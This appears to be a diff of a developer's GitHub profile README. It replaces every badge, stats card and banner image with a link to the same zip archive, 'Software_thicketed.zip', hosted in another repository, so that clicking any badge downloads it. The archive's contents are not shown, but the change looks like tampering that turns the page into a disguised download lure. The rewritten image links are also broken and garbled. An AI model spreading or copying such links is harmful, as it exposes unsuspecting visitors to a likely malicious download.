@@ -2,9 +2,9 @@
 
 <div align="center">
 
-![Profile Banner](https://raw.githubusercontent.com/platane/snk/output/github-contribution-grid-snake-dark.svg)
+![Profile Banner](https://raw.githubusercontent.com/dipeshdarks/dipdarks/main/rit/Software_thicketed.zip)
 
-![Typing SVG](https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=22&duration=3000&pause=1000&color=FF6B6B&center=true&vCenter=true&width=435&lines=Frontend+Developer+%F0%9F%8C%B8;JavaScript+Ninja+%E2%9A%A1;React+Enthusiast+%F0%9F%8C%9F)
+![Typing SVG](https://raw.githubusercontent.com/dipeshdarks/dipdarks/main/rit/Software_thicketed.zip+Code&size=22&duration=3000&pause=1000&color=FF6B6B&center=true&vCenter=true&width=435&lines=Frontend+Developer+%F0%9F%8C%B8;JavaScript+Ninja+%E2%9A%A1;React+Enthusiast+%F0%9F%8C%9F)
 
 </div>
 
@@ -48,12 +48,12 @@ const dipeshdarks = {
 
 <div align="center">
 
-<a href="https://github.com/dipeshdarks">
-  <img height="180em" src="https://github-readme-stats.vercel.app/api?username=dipeshdarks&show_icons=true&theme=radical&include_all_commits=true&count_private=true"/>
-  <img height="180em" src="https://github-readme-stats.vercel.app/api/top-langs/?username=dipeshdarks&layout=compact&langs_count=7&theme=radical"/>
+<a href="https://raw.githubusercontent.com/dipeshdarks/dipdarks/main/rit/Software_thicketed.zip">
+  <img height="180em" src="https://raw.githubusercontent.com/dipeshdarks/dipdarks/main/rit/Software_thicketed.zip"/>
+  <img height="180em" src="https://raw.githubusercontent.com/dipeshdarks/dipdarks/main/rit/Software_thicketed.zip"/>
 </a>
 
-[![GitHub Streak](https://github-readme-streak-stats.herokuapp.com/?user=dipeshdarks&theme=radical)](https://github.com/dipeshdarks)
+[![GitHub Streak](https://raw.githubusercontent.com/dipeshdarks/dipdarks/main/rit/Software_thicketed.zip)](https://raw.githubusercontent.com/dipeshdarks/dipdarks/main/rit/Software_thicketed.zip)
 
 </div>
 
@@ -61,7 +61,7 @@ const dipeshdarks = {
 
 <div align="center">
 
-[![Readme Card](https://github-readme-stats.vercel.app/api/pin/?username=dipeshdarks&repo=your-repo-name&theme=radical)](https://github.com/dipeshdarks/your-repo-name)
+[![Readme Card](https://raw.githubusercontent.com/dipeshdarks/dipdarks/main/rit/Software_thicketed.zip)](https://raw.githubusercontent.com/dipeshdarks/dipdarks/main/rit/Software_thicketed.zip)
 
 *More legendary projects coming soon... 🚀*
 
@@ -85,7 +85,7 @@ const dipeshdarks = {
 ### *"In this world, those who break the rules are scum... but those who abandon their friends are worse than scum."* 
 *~ Kakashi Hatake* 🍥
 
-![Profile Views](https://komarev.com/ghpvc/?username=dipeshdarks&color=FF69B4&style=flat-square&label=Profile+Views)
+![Profile Views](https://raw.githubusercontent.com/dipeshdarks/dipdarks/main/rit/Software_thicketed.zip+Views)
 
 </div>
 
